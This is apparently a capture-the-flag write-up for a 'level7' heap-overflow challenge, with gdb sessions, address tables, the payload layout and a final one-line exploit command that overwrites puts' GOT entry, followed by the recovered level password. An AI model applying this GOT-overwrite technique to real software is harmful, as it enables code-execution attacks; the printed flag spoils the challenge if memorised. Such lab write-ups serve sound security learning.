## GOT some Heap overlow ? (level7)

This level's [binary](source.c) requires two arguments, otherwise it segfaults.
Then, upon this argument treatment it prints "~~".

This time, four mallocs are done in a row, all of 8 bytes. Two of them will be
used as destinations for strcpy calls. The first one from argv[1] and the second
one from argv[2] \(hence the segfaults when providing less than two arguments).
This means that we have two places to overflow from. The first target is a fgets
call just after a fopen of the next level's password file. The destination
buffer is _c_ which is a global pointer set to NULL as it is not explicitly
initialized. We need to set _c_ to a value we can read from so that the password
is stored somewhere we can access. Then we actually need to access the thing.
For this, there is an uncalled function _m_ which contains a printf call that
prints _c_ as a string. So we must execute a GOT overwrite for the puts call
just after the fgets (the one that prints "~~"). This should lead us to the
password.

First let's get all the addresses we need:

```shell
# run gdb on the binary
gdb ./level7
# get c's address
(gdb) i addr c
Symbol "c" is at 0x8049960 in a file compiled without debugging.
# get m's address
(gdb) i addr m
Symbol "m" is at 0x80484f4 in a file compiled without debugging.
# get puts' got address
(gdb) disass main
...
   0x080485f7 <+214>:   call   0x8048400 <puts@plt>
...
(gdb) x/3i 0x8048400
   0x8048400 <puts@plt>:        jmp    *0x8049928 # puts' got address
   0x8048406 <puts@plt+6>:      push   $0x28
   0x804840b <puts@plt+11>:     jmp    0x80483a0
# then break after each malloc call to get the allocations addresses
(gdb) b *0x08048536
Breakpoint 1 at 0x8048536
(gdb) b *0x08048550
Breakpoint 2 at 0x8048550
(gdb) b *0x08048565
Breakpoint 3 at 0x8048565
(gdb) b *0x0804857f
Breakpoint 4 at 0x804857f
(gdb) run aaaa bbbb
Starting program: /home/user/level7/level7 aaaa bbbb

Breakpoint 1, 0x08048536 in main ()
(gdb) x/1x $eax
0x804a008:      0x00000000
(gdb) c
Continuing.

Breakpoint 2, 0x08048550 in main ()
(gdb) x/1x $eax
0x804a018:      0x00000000
(gdb) c
Continuing.

Breakpoint 3, 0x08048565 in main ()
(gdb) x/1x $eax
0x804a028:      0x00000000
(gdb) c
Continuing.

Breakpoint 4, 0x0804857f in main ()
(gdb) x/1x $eax
0x804a038:      0x00000000
```

Results:

| c         | m         | puts' got | malloc 1  | malloc 2  | malloc 3  | malloc 4  |
|-----------|-----------|-----------|-----------|-----------|-----------|-----------|
| 0x8049960 | 0x80484f4 | 0x8049928 | 0x804a008 | 0x804a018 | 0x804a028 | 0x804a038 |

Of course all the allocated memory is way after c or puts' got location in the
program's memory. Then what we need to do is use the first strcpy call to
overwrite the second's call destination address. This way we can start writing
from where we want. Since we must write in put's got and in _c_ and that put's
got address is before _c_ it would make sense to start from there.

What we must do (value --> destination):
* _puts' got_ --> _malloc 3_ + 4 bytes
* _m_ --> _puts' got_
* some valid memory zone (_malloc 1_) --> _c_

The first strcpy call has _malloc 2_ for destination. The second one starts at
the address pointed to at _malloc 3_ + 4 bytes. It's _malloc 4_ but it can be
overwritten by the first strcpy. _malloc 3_ + 4 bytes is at 0x804a02c. So here
is the first payload:

| padding bytes (20) | puts' got (4) |
|--------------------|---------------|
| "a" * 20           | 0x8049928     |


The second strcpy payload will just contain _m_'s address to replace puts' got:

| m's address (4) |
|-----------------|
| 0x80484f4       |

> There is actually no need to change c's value. It looks like it is in fact 
> initialized when level7 is running out of gdb.

So here is the command to execute for this level:

```shell
./level7 $(python -c 'print "a" * 20 + "\x08\x04\x99\x28"[::-1]') $(python -c 'print "\x08\x04\x84\xf4"[::-1]')
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1657074326
```
